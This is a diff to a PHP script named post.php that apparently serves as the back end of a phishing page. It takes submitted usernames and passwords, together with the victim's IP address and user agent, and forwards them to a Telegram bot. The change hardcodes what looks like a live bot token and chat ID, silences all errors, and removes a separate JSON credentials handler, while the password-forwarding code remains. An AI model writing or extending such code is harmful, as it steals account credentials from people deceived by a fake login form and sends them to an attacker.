@@ -1,26 +1,22 @@
 <?php
 // ============================================
 // POST.PHP - Send Everything to Telegram
-// No local files saved - all to Telegram
 // ============================================
 
 // Suppress all errors
 error_reporting(0);
 ini_set('display_errors', 0);
 
-// Load Telegram config
-$config_file = 'telegram_config.json';
-if (!file_exists($config_file)) {
-    die('{"status":"error","message":"Config missing"}');
-}
+// ============================================
+// 🔑 PUT YOUR CREDENTIALS HERE
+// ============================================
 
-$config = json_decode(file_get_contents($config_file), true);
-if (empty($config['bot_token']) || empty($config['chat_id'])) {
-    die('{"status":"error","message":"Invalid config"}');
-}
+// 👇 YOUR FULL BOT TOKEN FROM @BotFather
+// Example: "8591278217:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"
+$botToken = "8591278217:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";  // <-- REPLACE THIS
 
-$botToken = $config['bot_token'];
-$chatId = $config['chat_id'];
+// 👇 YOUR CHAT ID (the one you provided)
+$chatId = "6715599952";  // <-- KEEP THIS AS IS
 
 // ============================================
 // GET DATA
@@ -123,23 +119,6 @@ switch ($type) {
         $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n\n";
         $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "🖥️ <b>UA:</b> " . htmlspecialchars($ua) . "\n";
-        $message .= "⏰ <b>Time:</b> $time";
-        
-        sendTelegramMessage($message);
-        break;
-    
-    // ==========================================
-    // CREDENTIALS (JSON format)
-    // ==========================================
-    case 'credentials':
-        $data = json_decode($_POST['tg_data'] ?? '{}', true);
-        $username = $data['username'] ?? 'N/A';
-        $password = $data['password'] ?? 'N/A';
-        
-        $message = "🔐 <b>CREDENTIALS (JSON)</b>\n\n";
-        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
-        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n\n";
-        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "⏰ <b>Time:</b> $time";
         
         sendTelegramMessage($message);
